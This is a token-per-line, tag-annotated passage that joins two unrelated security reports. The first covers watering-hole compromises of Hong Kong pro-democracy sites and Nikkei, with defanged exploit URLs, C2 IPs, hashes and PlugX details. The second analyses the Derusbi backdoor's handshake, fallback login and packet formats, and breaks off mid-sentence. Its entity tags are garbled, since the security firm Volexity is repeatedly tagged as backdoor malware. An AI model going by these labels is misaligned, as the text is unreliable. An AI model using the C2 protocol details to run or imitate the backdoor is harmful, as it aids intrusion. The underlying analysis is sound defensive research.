is
a
pro-democracy
political
party
in
Hong
Kong
.

Like
the
ATD
website
,
at
the
time
of
this
writing
the
DPHK
websites
are
also
serving
up
malicious
code
,
so
please
browse
with
caution
.

During
our
research
for
this
post
,
we
also
became
aware
of
multiple
public
reports
related
to
the
compromise
of
the
DPHK
website
on
both
Twitter
and
via
ThreatConnect
.

Our
good
friend
Claudio
Giurianeri
posted
the
following
tweet
on
October
3
,
2014

The
website
of
the
Democratic
Party
of
Hong
Kong
has
been
compromised
and
still
is
.
Let
them
know
.
#OccupyCentral

Diving
further
into
some
of
the
replies
to
this
tweet
is
a
plethora
of
information
regarding
the
exploit
domain
java-se.com B_url.normal
.

In
particular
,
a
tweet
from
Brandon
Dixon
with
relevant
data
from
the
PassiveTotal
project
details
several
subdomains
and
IP
addresses
associated
with
java-se.com
.

While
Volexity  B_malware.backdoor
has
only
observed
a
handful
of
the
hostnames
in
the
wild
thus
far
,
other
active
subdomains
suggest
there
could
be
additional
on-going
exploit
or
malware
activity
from
the
domain
.

Additional
reporting
on
this
activity
and
another
going
back
to
August
2014
was
also
recently
shared
on
ThreatConnect
.

Despite
all
of
this
attention
,
the

DPHK
website
is
still
compromised
and
references
the
JavaScript
from
the
hostile
domain
.

It
is
also
worth
noting
that
this
is
not
the
first
time
that
the
DPHK
website
has
been
used
in
a
strategic
web
compromise
.
Back
in

May
2011
,
Kaspersky
Lab
reported
the
website
was
being
leveraged
to
target
users
with
Flash
Exploits
.

The
DPHK
appears
to
be
of
high
value
with
respect
to
targeting
visitors
.

People
Power
â€
'
Hong
Kong

During
the
course
of
investigating
activity
related
to
the
ATD
and
DPHK
websites
,
Volexity  B_malware.backdoor
also
observed
that
the
website
of
the
political
coalition
and
pan-democratic
organization
People
Power
in
Hong
Kong
(
www.peoplepower.hk  B_url.normal
)
had
been
compromised
as
well
.

However
,
unlike
the
other
two
websites
,
the
People
Power
website
did
not
contain
JavaScript
modifications
pointing
to
javase.com  B_url.normal
.

Instead
the
website
appears
to
have
malicious
iFrames
leveraging
the
Chinese
URL
shortener
985.so
.

At
the
bottom
of
several
of
the
pages
for
the
People
Power
website
are
four
iFrames
as
seen
in
this
screen
shot
of
the
website
source
:

Those
links
,
with
the
exception
of
the
first
one
,
all
redirect
to
exploit
pages
on
the
Hong
Kong
IP
address
58.64.178.77  B_ip.unknown
.

Meta
Refresh
Page
hXXp://985.so/bUYj  B_url.unknown
N/A
(
HTTP
404
)
hXXp://985.so/bUYe  B_url.unknown
hXXp://58.64.178.77:80/SiteLoader B_url.unknown
hXXp://985.so/b6hW  B_url.unknown
hXXp://58.64.178.77/mPlayer B_url.unknown
hXXp://985.so/bUYf  B_url.unknown
hXXp://58.64.178.77:80/0wnersh1p  B_url.unknown

These
pages
load
scripts
that
conduct
profiling
of
the
system
for
various
software
,
plugins
,
and
other
related
information
,
as
well
as
load
Java
exploits
designed
to
install
malware
on
the
target
system
.

If
successful
,
the
exploits
will
install
either
a
32-bit
or
64-bit
version
of
the
malware
.

Both
files
are
found
within
the
Java
Archives
files
.

Below
are
details
on
each
of
the
malware
files
.

Filename
:
main.dll

File
size
:
13824
bytes

MD5
hash
:
1befa2c2d1bfc8e87d52871c868f75fe  B_hash

SHA1
hash
:
8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817  B_hash

Notes
:
32-bit
version
of
malware
,
which
beacons
to
58.64.178.77:443  B_ip.unknown

Filename
:
main64.dll

File
size
:
15872
bytes

MD5
hash
:
a482a84d13c76b950ce5bc7e75f4edef  B_hash

SHA1
hash
:
c0a4b9145e0066f5c1534beddc9c666ea8eb0882  B_hash

Notes
:
64-bit
version
of
malware
,
which
beacons
to
58.64.178.77:443  B_ip.unknown
.

At
the
time
of
this
writing
,
the
People
Power
website
is
still
serving
up
malicious
code
.

Volexity  B_malware.backdoor
recommends
avoiding
this
website
and/or
browsing
with
caution
.

Volexity  B_malware.backdoor
believes
a
separate
group
of
attackers
is
responsible
for
this
exploit
activity
and
that
they
are
not
affiliated
with
the
java-se.com B_url.normal B_url.normal
operations
.

The
Professional
Commons
â€
'
Hong
Kong

While
digging
deeper
into
pro-democratic
websites
in
Hong
Kong
,
Volexity  B_malware.backdoor
also
discovered
peculiar
code
on
the
website
of
a
prodemocratic
and
pro-universal
suffrage
public
policy
think
thank
The
Professional
Commons
(
www.procommons.org.hk B_url.normal
)
.

In
the
case
of
this
website
,
there
is
suspicious
JavaScript
code
that
writes
an
iFrame
pointing
back
to
a
non-existent
HTML
page
on
a
hotel
website
in
South
Korea
.

The
code
from
the
website
can
be
seen
in
the
screen
shot
below
.

The
URL
in
question
points
to
:
hXXp://www.hotel365.co.kr/Lnk/tw/index.html B_url.unknown

This
link
does
not
work
and
will
redirect
a
visitor
back
to
the
main
page
of
the
website
.

There
does
not
appear
to
be
any
reason
for
the
Professional
Commmons
website
to
have
a
hidden
iFrame
link
randomly
placed
in
the
middle
of
its
HTML
code
.

It
is
suspected
that
this
was
a
formerly
active
exploit
URL
.

If
it
is
actually
malicious
,
it
is
possible
the
code
could
be
re-activated
at
any
time
.

Volexity  B_malware.backdoor
recommend
the
URL
and
the
Professional
Commons
website
be
browsed
with
caution
.

High
Profile
Compromised
Japanese
Website

The
Japanese
Nikkei

In
early
September
,
the
APT
group
behind
java-se.com B_url.normal
raised
its
visibility
on
Volexityâ€TMs B_malware.backdoor
radar
following
a
compromise
that
effectively
impacted
many
components
of
the
Japanese
Nikkei
.

In
the
first
week
of
September
,
a
subdomain
used
to
load
JavaScript
code
and
additional
files
onto
other
Nikkei
web
properties
such
as
www.nikkei.com  B_url.unknown
and
asia.nikkei.com B_url.unknown
was
compromised
.

In
particular
a
JavaScript
file
loaded
from
parts.nikkei.com  B_url.unknown
was
modified
to
reference
another
JavaScript
file
from
jre76.java-se.com B_url.unknown
hosted
on
the
Japanese
IP
address
211.125.81.203  B_ip.unknown
.
7506
|
211.125.80.0/22 B_ip.unknown
|
INTERQ
|
JP
|
GMO.JP
|
GMO
INTERNET
INC
.

The
code
has
since
been
taken
down
.

However
,
in
early
September
the
JavaScript
was
pre-pended
to
the
file
http://parts.nikkei.com/parts/SC/s_cDS.js B_url.unknown
seen
in
the
screen
shot
below
.

Like
the
JavaScript
from
the
ATD
and
DPHK
websites
,
Volexity  B_malware.backdoor
was
never
actually
able
to
obtain
a
live
copy
of
this
script
.

Each
request
results
in
an
HTTP
403
response
from
the
server
.

Volexity  B_malware.backdoor
suspects
the
code
was
either
active
at
select
times
and/or
was
only
served
to
a
subset
of
visitors
.

The
code
has
not
been
observed
on
the
s_cDS.js
file
for
nearly
a
month
now
.

Live
Exploits
,
Stolen
Certificates
,
and
Signed
Malware

While
tracking
this
APT
activity
,
Volexity  B_malware.backdoor
has
also
come
across
other
seemingly
unrelated
compromises
of
websites
in
Hong
Kong
and
Japan
associated
with
the
java-se.com B_url.normal
activity
.

Despite
several
sites
being
compromised
,
the
above
activity
tied
to
java-se.com B_url.normal
did
not
result
in
the
successful
capture
of
actual
exploit
code
or
malware
.

However
,
research
into
other
websites
and
activity
involving
java-se.com B_url.normal
did
lead
Volexity  B_malware.backdoor
to
live
exploits
and
malware
.

In
particular
Volexity  B_malware.backdoor
came
across
live
exploit
code
hosted
at
jdk-7u12-windows-i586.java-se.com
on
the
Japanese
IP
address
210.253.96.200  B_ip.unknown
.

7506
|
210.253.96.0/20 B_ip.unknown
|
INTERQ
|
JP
|
GMO.JP
|
GMO
INTERNET
INC
.

This
system
hosted
a
JavaScript
file
,
which
in
turned
loads
a
malicious
Java
Applet
.

In
testing
the
the
Java
Applet
pops
up
a
notification
to
the
user
asking
them
if
they
want
to
run
the
applet
.

Volexity  B_malware.backdoor
has
not
had
enough
time
to
thoroughly
analyze
the
file
to
see
if
it
is
an
actual
exploit
or
if
the
attackers
rely
on
user
assisted
malware
installation
.

The
pop-up
does
make
it
appear
as
if
the
file
is
an
update
to
Java
.

The
popup
displayed
by
Java
is
displayed
below
.

As
can
be
seen
in
the
image
above
,
this
popup
could
be
misconstrued
by
a
user
as
an
update
to
Java
despite
the
java-se.com B_url.normal
domain
and
the
Publisher
being
listed
as
WindySoft
.

Interestingly
the
Java
Archive
being
loaded
is
digitally
signed
by
a
certificate
issued
to
WindySoft
,
an
online
gaming
company
from
South
Korea
.

We
cannot
confirm
this
certificate
actually
belonged
to
WindySoft
at
any
point
in
time
,
however
,
there
is
fairly
established
precedent
of
certificates
from
online
gaming
companies
being
used
to
digitally
sign
malware
and
attack
tools
.

PlugX
Strikes
Again
â€
'
Digitally
Signed
&
Using
163.com
Blogs

As
one
might
expect
,
choosing
to
press
the
Run
button
would
be
bad
news
for
someone
presented
with
this
prompt
.

If
one
were
to
click
Run
from
this
prompt
,
it
would
result
in
the
file
css.jpg
being
download
over
an
encrypted
channel
from
a
folder
on
https://elsa-jp.jp  B_url.unknown
.

Note
that
elsa-jp.jp
is
a
website
hosted
on
the
same
IP
address
jdk-7u12-windows-i586.java-se.com  B_url.unknown
and
is
likely
compromised
.

The
file
css.jpg
is
of
course
not
a
JPEG
file
,
it
is
an
executable
that
has
been
encoded
with
the
single-byte
XOR
key
0xFF
.

Filename
:
css.jpg

File
size
:
168776
bytes

MD5
hash
:
b3a9e6548fb3cc511096af4d68b2e745  B_hash

SHA1
hash
:
394703d1240ccd3aaeeef50c212313e3036741b1  B_hash

Notes
:
Executable
file
downloaded
by
Java
Applet
that
has
been
encoded
with
XOR
0Ã—99

Taking
a
closer
look
at
the
resulting
executable
we
have
,
it
turns
out
it
is
a
newer
sample
of
PlugX
.

In
this
particular
sample
an
interesting
and
notable
string
was
observed
:

C:\wocawocawoca\piao\Release\caca.pdb

Also
of
interest
is
that
as
observed
from
the
Java
Applet
,
the
executable
is
also
digitally
signed
by
a
certificate
issued
to
â
€œWindySoft.â€

Upon
execution
the
malware
sample
immediately
does
a
DNS
resolution
for
the
following
hostname
:
jduhf873jdu7.blog.163.com B_url.unknown

The
PlugX
sample
connects
to
the
blog
and
parses
the
page
for
a
command
for
where
to
connect
to
next
.

This
is
very
similar
to
the
method
described
by
FireEye
in
their
blog
on
Operation
Poisoned
Hurricane
.

The
primary
difference
being
that
the
attackers
opted
to
use
a
163.com
Blog
over
a
Google
Code
page
to
embed
the
command
.

Taking
a
closer
look
at
the
Blog
page
the
following
post
is
observed
:

The
primary
string
to
focus
on
is
in
the
title
of
the
post
:

DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS

Using
the
same
decoding
routine
describe
by
Cassidian
in
a
PlugX
post
of
theirs
from
earlier
this
year
,
we
can
see
this
command
decodes
to
instruct
the
malware
to
connect
to
a
U.S.-based
Linode
IP
address
at
Hurricane
Electric
:
173.255.217.77  B_ip.unknown
.

6939
|
173.255.208.0/20  B_ip.normal
|
HURRICANE
|
US
|
LINODE.COM
|
LINODE

A
look
at
passive
DNS
identifies
several
hostnames
that
recently
resolved
to
the
IP
address
.

The
ones
that
still
resolve
to
the
IP
are
listed
below
:
dns.apasms.com  B_url.unknown
ns.gpass1.org B_url.unknown
ns1.gpass1.org  B_url.unknown

These
hostnames
may
be
related
but
at
the
time
of
this
writing
we
have
not
seen
them
in
use
in
malware
and
are
unable
to
confirm
.

Conclusion

As
we
have
seen
for
several
years
now
,
dissenting
groups
,
especially
those
seeking
increased
levels
of
freedom
frequently
find
themselves
targeted
for
surveillance
and
information
extraction
.

In
the
digital
age
,
a
strategic
web
compromise
(
exploit
drive-by
)
has
become
a
key
weapon
of
choice
for
to
conduct
such
operations
.

These
types
of
attacks
are
far
from
overt
,
as
a
typical
target
and
victim
opted
to
go
on
their
own
to
what
they
believe
should
be
a
safe
and
trusted
website
.

In
the
case
of
this
post
,
it
appears
that
at
least
two
different
attackers
were
involved
in
compromising
and
placing
malicious
code
on
Pro-Democratic
websites
in
Hong

Kong
.
This
is
not
the
first
time
and
surely
will
not
be
the
last
time
that
those
in
favor
of
democracy
in
Hong
Kong
will
be
targeted
.

Unfortunately
with
the
level
of
access
and
infrastructure
the
attackers
appear
to
have
,
this
is
quite
an
uphill
battle
.

Continuing
to
expose
these
attack
is
one
means
that
shines
light
on
these
attack
operations
with
an
aim
at
putting
a
dent
in
their
success
.
Derusbi B_malware.backdoor
(
Server
Variant
)
Analysis

Overview

There
are
two
types
of
Derusbi B_malware.backdoor
malware
:
a
client-server
model
and
a
server-client
model
.

Both
types
provide
basic
RAT B_malware.backdoor
functionality
with
the
distinction
between
the
two
being
largely
the
directionality
of
the
communication
.

This
report
will
focus
on
the
server-client
variant
(
or
simply
,
the
'
server
variant
'
)
of
Derusbi B_malware.backdoor
,
which
acts
as
a
server
on
a
victim's
machine
and
waits
for
commands
from
a
controlling
client
.

In
and
of
itself
,
the
Derusbi B_malware.backdoor
server
variant
is
a
largely
unremarkable
RAT B_malware.backdoor
when
viewed
from
the
perspective
of
functional
capabilities
.

The
server
variant
supports
basic
RAT B_malware.backdoor
functionality
such
as
file
management
(
uploading
and
downloading
)
,
network
tunneling
and
remote
command
shell
.

What
makes
the
server
variant
interesting
is
the
device
driver
that
the
variant
installs
.

The
server
variant
utilizes
a
device
driver
in
order
to
hook
into
the
Windows
firewall
by
either
using
largely
undocumented
Windows
Firewall
hooking
techniques
found
in
Windows
XP
and
older
or
by
using
the
documented
Windows
Filtering
Platform
found
in
Windows
Vista
and
later
.

The
driver
,
after
hooking
the
firewall
using
either
of
the
two
mentioned
interfaces
,
will
inspect
incoming
network
packets
.

If
a
specific
handshake
occurs
between
the
client
and
the
server
variant
,
the
remainder
of
the
communication
session
for
the
established
session
will
be
redirected
to
the
server
variant
.

If
the
driver
does
not
detect
the
appropriate
handshake
,
then
the
network
traffic
is
allowed
to
pass
unobstructed
.
This
allows
an
attacker
to
hide
their
communication
within
a
cluster
of
network
sessions
originating
from
a
single
IP
such
as
would
be
the
case
for
a
client
performing
multiple
HTTP
requests
against
a
web
server
.

Startup
Sequence

The
server
variant
runs
as
a
svchost
dependent
service
.

While
the
server
variant
binary
does
have
exports
related
to
the
standard
service
DLL
(
e.g.
ServiceMain
,
DllRegisterService
,
etc
.
)
,
the
startup
sequence
truly
begins
in
the
DllEntryPoint
function
.

When
loaded
into
memory
via
a
LoadLibrary
or
equivalent
function
call
,
the
server
variant
will
determine
the
name
of
the
host
binary
(
presumably
svchost.exe
)
as
well
as
its
own
DLL's
name
.

The
binary
then
spawns
a
new
thread
that
contains
the
main
server
variant
code
in
order
to
allow
the
DllEntryPoint
routine
to
return
to
the
calling
function
.

Within
the
main
server
variant
function
(
dubbed
mainThread
)
,
the
server
variant
loads
a
pointer
to
the
API
function
GetCommandLineW
,
locates
the
pointer
in
memory
to
the
command
line
string
,
and
then
locates
the
first
space
within
the
command
line
string
and
terminates
the
string
by
placing
a
NULL
character
at
the
location
.

The
server
variant
then
attempts
to
determine
if
it
has
suitable
access
rights
within
the
system
in
order
to
operation
.

The
check
for
access
rights
effectively
checks
to
see
if
the
server
variant
process
is
running
under
the
NT
Authority
.

If
the
check
is
unsuccessful
,
then
the
server
variant
terminates
.

With
the
command
line
patched
and
authority
verified
,
the
server
variant
sleeps
for
5
seconds
before
verifying
that
the
fShutdown
flag
is
not
set
.

The
fShutdown
flag
can
become
set
by
the
process
loading
the
server
variant
calling
the
DllRegisterServer
export
.

The

DllRegisterServer
function
,
among
other
tasks
,
will
attempt
to
install
the
server
variant
as
a
server
on
the
victim's
machine
.
Therefore
,
by
waiting
5
seconds
before
continuing
the
mainThread
functionality
,
the
server
variant
is
giving
the
DllRegisterServer
time
to
activate
and
perform
the
necessary
operations
to
ensure
that
the
server
variant
is
properly
installed
and
activated
as
a
service
.

The
mainThread
calls
the
mainLoop
function
of
the
server
variant
.

The
mainLoop
function
begins
by
loading
the
unique
infection
ID
for
the
victim's
machine
from
the
registry
(
under
the
key
value
located
at
HKLM\SOFTWARE\Microsoft\Rpc\Security
)
.
The
infection
ID
,
if
present
,
must
be
decoded
by
XOR'ing
each
byte
of
the
string
with
a
static
byte
value
(
typically
0x5F
)
.

If
the
infection
ID
does
not
exist
within
the
registry
,
the
server
variant
will
attempt
to
load
the
configuration
from
an
encoded
buffer
located
immediately
after
the
static
string

XXXXXXXXXXXXXXX
,
decode
the
buffer
by
starting
at
the
last
byte
and
XORing
each
previous
byte
by
the
current
byte
value
in
reverse
order;
the
server
variant
will
then
use
a
specific
portion
of
the
configuration
blob
as
the
infection
ID's
base
.

Next
,
the
server
variant
will
append
a
hyphen
and
a
four
digit
value
to
the
end
of
the
infection
ID
to
generate
the
unique
infection
ID
for
the
victim's
machine
.

The
newly
generated
infection
ID
is
then
saved
to
the
registry
location
stated
previously
.

The
mainLoop
attempts
to
get
the
privileges
for
SeDebugPrivilege
,

SeLoadDriverPrivilege
,
SeShutdownPrivilege
,
and
SeTcbPrivilege
in
order
to
perform
the
necessary
operations
to
load
the
driver
portion
of
the
server
variant
.

The
mainLoop
will
attempt
to
open
a
handle
to
the
driver
(
if
it
is
already
installed
)
by
calling
CreateFile
with
the
filename
of
\Device\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}
.
Failing
this
,
the
mainLoop
determines
if
the
victim's
machine
is
running
the
360
antivirus
product
by
looking
for
a
process
with
the
name
ZhuDongFangYu.exe
.

If
the
process
is
running
,
the
driver
is
not
installed
but
the
mainLoop
continues
regardless
.

If
the
process
is
not
found
,
however
,
the
mainLoop
will
extract
the
driver
binary
from
an
encoded
buffer
within
itself
,
decode
the
file
in
memory
(
using
a
rotating
4-byte
XOR
key
)
,
and
install
the
driver
on
the
victim's
machine
as
%SYSDIR%\Drivers\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}.sys
.

With
the
driver
present
(
or
recently
installed
)
,
the
mainLoop
spawns
another
thread
(
dubbed

DerusbiThread::DerusbiThread
)
that
acts
as
the
primary
communication
loop
.

DerusbiThread::DerusbiThread
begins
by
generating
a
PCC_SOCK
object
.

PCC_SOCK
is
an
abstraction
for
the
communication
subsystem
.

The
prototype
for
PCC_SOCK
appears
in

Figure
1
.
//
destructor
class
BD_SOCK
//
members
~BD_SOCK();

BD_SOCK*
Copy(bool
fCopySocket);
//
duplicate
object
//
member
variables

DWORD
dwLastError;
char
szHostName[256];

DWORD
dwListeningPortNumber;

SOCKET
sktRemoteEndpoint;

SOCKET
hListeningSocket;
class
PCC_SOCK
:
BD_SOCK
~PCC_SOCK();
//
destructor
//
virtual
members

PCC_SOCK
*
Copy(bool
fCopyListeningSocket);

SOCKET
ConnectToRemoteEndpointByNameAndAttemptChannelByPOSTOrHandshake(int
a2
,
int
a3
,
int
a4
,
int
a5
,
char
*pszHostname
,
int
wHostPort);

SOCKET
ConnectToRemoteEndpointByNameAndHandshake(char
*pszHostname
,
int
wHostPort);

SOCKET
ConnectToRemoteEndpointByNameAndPerformPOSTLogin(char
*pszHostname
,
int
wHostPort);

SOCKET
WaitForClient();
int
SendEncodedData(int
dwPktType
,
void
*payload
,
size_t
dwPayloadSize);
int
RecvEncodeData(DWORD
*pdwPktType
,
char
**pvPayload
,
DWORD
*pdwPayloadSize);
void
freeMemory(void
*pMemory);
//
member
functions
int
SendVictimInfo();
int
WaitForReadEvent(int
dwTimeout);
int
SOCKSConnectWithRandomLocalPort(int
dwEndPointIP
,
u_short
hostshort);
int
BindToRandomPort(SOCKET
s);
int
SendBuffer(SOCKET
s
,
char
*buf
,
int
len);

SOCKET
AcceptIncomingConnection();

SOCKET
ConnectToRemoteEndpointByName(char
*szHostName
,
int
hostshort);

SOCKET
ConnectToRemoteEndpoint(int
dwIP
,
u_short
wPort);
int
ReadFromRemoteEndpoint(char
*buf
,
int
len);

SOCKET
NewSocket();
int
BindSocket(SOCKET
s
,
int
dwLowPort
,
int
dwHighPort);
int
SendAuthenicationResponse(void
*pvResponse);
int
SendHTTP200ResponseIfViaHeaderFound
(
char
*Str);
//
member
variables
char
compressionBuffer[65536];

Figure
1
:
PCC_SOCK
Declaration
in
Pseudo-C++

With
a
new
PCC_SOCK
object
allocates
,
DerusbiThread::DerusbiThread
selects
a
port
between
40,000
and
45,000
to
use
as
a
listening
port
.

The
port
number
is
sent
to
the
driver
(
via

IOCTL
0x220200
)
in
order
to
inform
the
driver
where
to
redirect
incoming
traffic
.

The
'
Windows

Device
Driver
(
Firewall
Hook
)
'
section
explains
the
functionality
of
the
driver
in
greater
detail
.

DerusbiThread::DerusbiThread
binds
to
the
specified
port
and
opens
the
port
as
a
listener
.

At
this
point
DerusbiThread::DerusbiThread
enters
an
infinite
loop
of
waiting
for
new
connections
to
the
listening
socket
and
dispatching
a
new
thread
(
dubbed
CommLoop
)
to
handle
the
traffic
for
the
socket
until
fShutdown
is
set
.

At
this
point
,
the
startup
sequence
for

Derusbi B_malware.backdoor
is
complete
and
the
server
variant
moves
into
a
communication
and
command
dispatch
phase
.

Windows
Device
Driver
(
Firewall
Hook
)

The
communication
between
the
controlling
client
and
the
Derusbi B_malware.backdoor
server
variant
depends
on
the
device
driver
being
in
place
.
The
authors
of
the
device
driver
designed
the
driver
to
work
on

Windows
2000
and
later
versions
of
the
Windows
operating
system
.

Depending
on
the
version
of
the
victim's
OS
,
the
driver
will
hook
the
Windows
Firewall
by
either
using
the
surprisingly
undocumented
IOCTL_IP_SET_FIREWALL_HOOK
command
of
the
\\Device\IP
device
for

Windows
XP
or
older
machines
or
by
using
the
documented
Windows
Filtering
Platform
(
WFP
)
found
in
Windows
Vista
and
later
.

The
device
driver
inspects
incoming
network
traffic
from
any
client
connecting
to
the
victim
machine
,
determines
if
an
appropriate
handshake
packet
occurs
at
the
beginning
of
a
new
TCP
session
,
and
then
makes
the
decision
to
reroute
the
network
traffic
to
the
Derusbi B_malware.backdoor
malware
or
let
the
traffic
continue
unaltered
to
its
original
service
.

Figure
2
:
Device
Driver
Traffic
Redirection

Once
a
session
has
been
established
by
means
of
a
valid
handshake
,
any
subsequent
packets
from
the
client
for
the
given
TCP
session
will
automatically
be
directed
by
the
device
driver
to
the
Derusbi B_malware.backdoor
server
variant
.

The
device
driver
does
not
capture
or
store
any
network
traffic
outside
of
the
initial
handshake
inspection
.

Communication
and
Command
Dispatch

The
Derusbi B_malware.backdoor
server
variant
will
select
an
available
,
random
port
between
the
range
of
40,000
and
45,000
on
the
victim's
machine
upon
which
to
listen
.

After
selecting
the
port
,
the
server
variant
will
wait
for
incoming
connections
and
instruct
the
driver
to
redirect
appropriate
TCP
sessions
to
the
listening
port
.

In
order
to
establish
a
valid
communication
channel
between
the
server
variant
and
a
controlling
client
,
a
specific
handshake
is
required
.

The
handshake
between
a
client
and
the
server
variant
is
well
defined
and
consisting
of
64
bytes
,
the
data
within
the
handshake
is
entirely
random
with
the
exception
of
the
3rd
and
8th
DWORD
.

The
handshake
begins
when
the
client
sends
a
64
byte
random
buffer
with
the
3rd
(
offset
12
)
and
8th
(
offset
32
)
DWORDs
defined
as
:

DWORD3
==
~DWORD0

DWORD8
==
ROR(DWORD0
,
7
)

The
server
will
acknowledge
the
handshake
by
sending
a
64
byte
random
buffer
with
the
same
pattern
for
the
3rd
and
8th
DWORDs
based
on
the
new
,
randomly
generated
1st
DWORD
(
offset
0
)
.

It
is
the
client's
handshake
that
the
driver
for
the
server
variant
triggers
off
of
.

Some
older
versions
of
the
server
variant
use
a
different
set
of
DWORDs
to
validate
the
handshake
,
also
the
tests
are
the
same
.

These
other
versions
have
been
observed
to
use
the
following
DWORDs
:

DWORD1
==
~DWORD0

DWORD2
==
ROR(DWORD0
,
7
)

If
the
handshake
fails
,
the
server
variant
provides
a
secondary
means
to
authenticate
a
client
.

Presumably
a
failsafe
if
the
driver
is
unable
to
load
,
the
secondary
method
requires
the
client
to
send
a
POST
request
with
the
following
form
:

POST
/forum/login.cgi
HTTP/1.1\r\n

In
addition
,
the
POST
request
must
contain
a
Via
field
.

If
the
request
and
the
Via
field
exist
,
the
server
variant
authenticates
the
client
and
responds
with

HTTP/1.0
200

Server
:
Apache/2.2.3
(
Red
Hat
)

Accept-Ranges
:
bytes

Content-Type
:
text/html

Proxy-Connection
:
keep-alive

If
the
client's
request
does
not
meet
the
appropriate
authentication
criteria
,
the
server
variant
sends
:

HTTP/1.0
400
Bad
Request

Server
:
Apache/2.2.3
(
Red
Hat
)

Connection
:
close

With
a
communication
channel
between
the
server
variant
and
the
client
established
,
the
server
sends
information
about
the
victim's
computer
.

Consisting
of
a
180
byte
data
structure
(
Figure
3
)
,
the
server
variant
provides
the
client
with
a
variety
of
details
about
the
victim's
machine
.

The

VictimInfoPacket
has
an
identifier
of
2
(
see
the
dwPktType
explanation
below
)
.

The
communication
between
the
server
and
the
client
at
this
point
,
and
for
the
remainder
of
the
session
,
is
encrypted
.

#pragma
pack(push
,
1
)
struct
VictimInfoPacket
int
magicValue;
char
szInfectionID[64];
char
szComputerName[64];
char
szSelfIP[16];
char
unknownArray[16];
int
dwOSandSPVersionInfo;
int
dwBuildNumber;
char
unknownValue;
char
OemId;
__int16
unused_align2;
int
fCampaignCodeMatch;
#pragma
pack(pop
)

Figure
3
:
VictimInfoPacket
Structure
Definition

Communication
between
the
client
and
the
server
variant
exists
in
the
form
of
a
sequence
of
encrypted
datagrams
.

Each
datagram
consists
of
a
24
byte
header
followed
by
an
optional
payload
section
.

The
header
is
not
encrypted
but
if
the
optional
payload
is
attached
,
the
payload
is
encrypted
using
a
DWORD
XOR
.

The
format
of
the
header
is
as
follows
:
struct
PacketHeader

DWORD
dwTotalPacketSize;

DWORD
dwPktType;

DWORD
dwChecksum;

DWORD
dwEncryptionKey;

DWORD
fCompressedPayload;

DWORD
dwDecompressedSize;

The
dwTotalPacketSize
field
defines
the
total
size
of
the
datagram
including
both
the
size
of
the
header
and
the
size
of
the
optional
payload
.

The
dwPktType
field
correlates
to
the
module

ID
which
allows
the
server
variant
to
route
the
datagram
to
the
appropriate
module
without
further
inspection
of
the
payload
data
.

The
dwChecksum
value
is
sum
of
all
of
the
bytes
within
the
optional
header
(
the
field
is
ignored
,
but
present
,
if
there
is
no
payload
section
)
.

The
dwEncryptionKey
is
the
32-bit
XOR
encryption
key
for
the
payload
section
.

If
the
fCompressedPayload
field
is
non-zero
,
then
the
data
within
the
payload
is
compressed
using

LZO
compression
(
prior
to
XOR
encoding
)
and
the
dwDecompressedSize
field
represents
the
final
size
of
the
payload
data
after
decompression
.

The
payload
section
can
have
up
to
three
different
presentations
depending
on
if
compression
is
used
.

The
first
presentation
is
the
original
payload
data
as
generated
by
the
client
or
server
,
the
second
presentation
is
the
LZO
compressed
form
,
and
the
final
presentation
(
the
presentation
that
exists
going
across
the
network
)
is
the
32-bit
XOR
encoded
data
blob
.

Figure
4
provides
a
graphical
representation
of
the
presentation
types
of
the
payload
section
.

Figure
4
:
Possible
Presentations
of
the
Payload
Section
of
a
Derusbi B_malware.backdoor
Server
Variant's
Datagram

After
sending
the
server
information
via
the
VictimInfoPacket
,
the
server
variant
spins
off
a

CommLoop
thread
for
the
connection
and
returns
to
waiting
for
new
connections
from
clients
to
appear
.

The
CommLoop
thread
begins
by
establishing
the
set
of
internal
command
handlers
available
to
the
server
variant
.

With
the
exception
of
the
administrative
command
handler
(
which
is
built
into
the
CommLoop
)
,
each
of
the
internal
commands
consists
of
an
object
derived
from
a
base
object

PCC_BASEMOD
.

//
destructor
class
PCC_BASEMOD

Figure
5
:
PCC_BASEMOD
Pseudo-C++
Declaration
~PCC_BASEMOD();
//
virtual
member
functions
void
*return1();
//
always
returns
1
void
Cleanup(void);
void
ProcessPacket(void
*pkt
,
DWORD
dwPktSize);
int
ReadWaitingData(void
**pPacket
,
DWORD
*dwPktSize);
int
MallocWithClear(size_t
Size);
int
Free(void
*Memory);
//
member
variables

DWORD
dwPacketIdentifierCode;

The
server
variant
appears
to
have
a
modular
design
allowing
an
attacker
to
compile
only
the
components
that
are
necessary
for
any
given
operation
.

The
malware
supports
up
to
8
different
modules
per
sample
with
each
module
designating
its
own
ID
code
.

Novetta
has
observed
the
following
modules
:

Class
Name
0x81
PCC_CMD
0x82
PCC_PROXY
0x84
PCC_FILE
0xF0
n/a

Module
Description

Remote
command
shell

Network
tunneling

File
management

Derusbi B_malware.backdoor
administrative
[built-in
module
that
does
not
count
against
the
maximum
of
8
modules
per
variant
sample]

Given
the
spacing
in
ID
numbers
(
as
noted
in
the
gap
between
0x82
and
0x84
in
an
otherwise
sequential
ID
scheme
)
,
it
is
conceivable
that
additional
modules
exist
.

After
establishing
the
tools
,
an
infinite
loop
(
CommLoop
)
is
entered
in
which
the
server
variant
will
wait
for
up
to
1/100
of
a
second
for
input
from
the
network;
if
such
input
arrives
,
the
server
routes
the
packet
to
the
appropriate
handler
.

If
the
network
input
does
not
arrive
,
the
CommLoop
queries
each
of
the
command
handlers
for
any
packets
they
may
have
queued
(
by
calling
each
command
handler's
ReadWaitingData
function
)
and
transmits
the
packets
the
handlers
have
generated
.

Additionally
,
if
more
than
60
seconds
passes
between
network
inputs
from
the
client
or
network
outputs
from
the
server
variant
,
the
CommLoop
will
send
out
a
beacon
packet
(
dwPktType
=
4
)
.

CommLoop
routes
packets
to
the
appropriate
command
handler
object
by
locating
the
dwPacketIdentifierCode
within
each
of
the
registered
command
handlers
that
matches
the
incoming
packets
dwPktType
.

When
the
appropriate
command
handler
is
found
,

CommLoop
passes
the
payload
of
portion
of
the
packet
to
the
command
handler's

ProcessPacket
function
.

PCC_CMD

The
PCC_CMD
object
contains
the
remote
shell
functionality
of
the
server
variant
along
with
the
ability
to
execute
arbitrary
programs
.

Derived
from
the
PCC_BASEMOD
class
,
the
PCC_CMD
class's
operations
are
focused
largely
in
the
ProcessPacket
and
ReadWaitingData
functions
.

The
PCC_CMD::ProcessPacket
function
works
as
a
stub
function
that
merely
passes
the
packet's
payload
data
(
